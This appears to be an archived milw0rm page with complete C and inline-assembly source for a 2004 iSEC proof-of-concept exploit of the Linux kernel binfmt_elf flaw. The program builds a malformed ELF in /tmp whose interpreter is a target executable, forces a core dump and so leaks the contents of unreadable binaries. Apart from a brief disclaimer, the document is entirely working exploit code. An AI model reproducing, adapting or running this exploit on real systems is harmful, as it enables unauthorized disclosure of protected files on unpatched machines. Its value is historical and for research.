<html><head><title>Linux Kernel (<= 2.4.27 , 2.6.8) binfmt_elf Executable File Read Exploit </title></head><pre>/*
 *
 * binfmt_elf executable file read vulnerability
 *
 * gcc -O3 -fomit-frame-pointer elfdump.c -o elfdump
 *
 * Copyright (c) 2004 iSEC Security Research. All Rights Reserved.
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;unistd.h&gt;

#include &lt;sys/types.h&gt;
#include &lt;sys/resource.h&gt;
#include &lt;sys/wait.h&gt;

#include &lt;linux/elf.h&gt;

#define BADNAME &quot;/tmp/_elf_dump&quot;

void usage(char *s)
{
        printf(&quot;\nUsage: %s executable\n\n&quot;, s);
        exit(0);
}

// ugly mem scan code :-)
static volatile void bad_code(void)
{
__asm__(
// &quot;1: jmp 1b \n&quot;
                &quot; xorl %edi, %edi \n&quot;
                &quot; movl %esp, %esi \n&quot;
                &quot; xorl %edx, %edx \n&quot;
                &quot; xorl %ebp, %ebp \n&quot;
                &quot; call get_addr \n&quot;

                &quot; movl %esi, %esp \n&quot;
                &quot; movl %edi, %ebp \n&quot;
                &quot; jmp inst_sig \n&quot;

                &quot;get_addr: popl %ecx \n&quot;

// sighand
                &quot;inst_sig: xorl %eax, %eax \n&quot;
                &quot; movl $11, %ebx \n&quot;
                &quot; movb $48, %al \n&quot;
                &quot; int $0x80 \n&quot;

                &quot;ld_page: movl %ebp, %eax \n&quot;
                &quot; subl %edx, %eax \n&quot;
                &quot; cmpl $0x1000, %eax \n&quot;
                &quot; jle ld_page2 \n&quot;

// mprotect
                &quot; pusha \n&quot;
                &quot; movl %edx, %ebx \n&quot;
                &quot; addl $0x1000, %ebx \n&quot;
                &quot; movl %eax, %ecx \n&quot;
                &quot; xorl %eax, %eax \n&quot;
                &quot; movb $125, %al \n&quot;
                &quot; movl $7, %edx \n&quot;
                &quot; int $0x80 \n&quot;
                &quot; popa \n&quot;

                &quot;ld_page2: addl $0x1000, %edi \n&quot;
                &quot; cmpl $0xc0000000, %edi \n&quot;
                &quot; je dump \n&quot;
                &quot; movl %ebp, %edx \n&quot;
                &quot; movl (%edi), %eax \n&quot;
                &quot; jmp ld_page \n&quot;

                &quot;dump: xorl %eax, %eax \n&quot;
                &quot; xorl %ecx, %ecx \n&quot;
                &quot; movl $11, %ebx \n&quot;
                &quot; movb $48, %al \n&quot;
                &quot; int $0x80 \n&quot;
                &quot; movl $0xdeadbeef, %eax \n&quot;
                &quot; jmp *(%eax) \n&quot;

        );
}

static volatile void bad_code_end(void)
{
}

int main(int ac, char **av)
{
struct elfhdr eh;
struct elf_phdr eph;
struct rlimit rl;
int fd, nl, pid;

        if(ac&lt;2)
                usage(av[0]);

// make bad a.out
        fd=open(BADNAME, O_RDWR|O_CREAT|O_TRUNC, 0755);
        nl = strlen(av[1])+1;
        memset(&amp;eh, 0, sizeof(eh) );

// elf exec header
        memcpy(eh.e_ident, ELFMAG, SELFMAG);
        eh.e_type = ET_EXEC;
        eh.e_machine = EM_386;
        eh.e_phentsize = sizeof(struct elf_phdr);
        eh.e_phnum = 2;
        eh.e_phoff = sizeof(eh);
        write(fd, &amp;eh, sizeof(eh) );

// section header(s)
        memset(&amp;eph, 0, sizeof(eph) );
        eph.p_type = PT_INTERP;
        eph.p_offset = sizeof(eh) + 2*sizeof(eph);
        eph.p_filesz = nl;
        write(fd, &amp;eph, sizeof(eph) );

        memset(&amp;eph, 0, sizeof(eph) );
        eph.p_type = PT_LOAD;
        eph.p_offset = 4096;
        eph.p_filesz = 4096;
        eph.p_vaddr = 0x0000;
        eph.p_flags = PF_R|PF_X;
        write(fd, &amp;eph, sizeof(eph) );

// .interp
        write(fd, av[1], nl );

// execable code
        nl = &amp;bad_code_end - &amp;bad_code;
        lseek(fd, 4096, SEEK_SET);
        write(fd, &amp;bad_code, 4096);
        close(fd);

// dump the shit
        rl.rlim_cur = RLIM_INFINITY;
        rl.rlim_max = RLIM_INFINITY;
        if( setrlimit(RLIMIT_CORE, &amp;rl) )
                perror(&quot;\nsetrlimit failed&quot;);
        fflush(stdout);
        pid = fork();
        if(pid)
                wait(NULL);
        else
                execl(BADNAME, BADNAME, NULL);

        printf(&quot;\ncore dumped!\n\n&quot;);
        unlink(BADNAME);

return 0;
} 

// milw0rm.com [2004-11-10]</pre></html>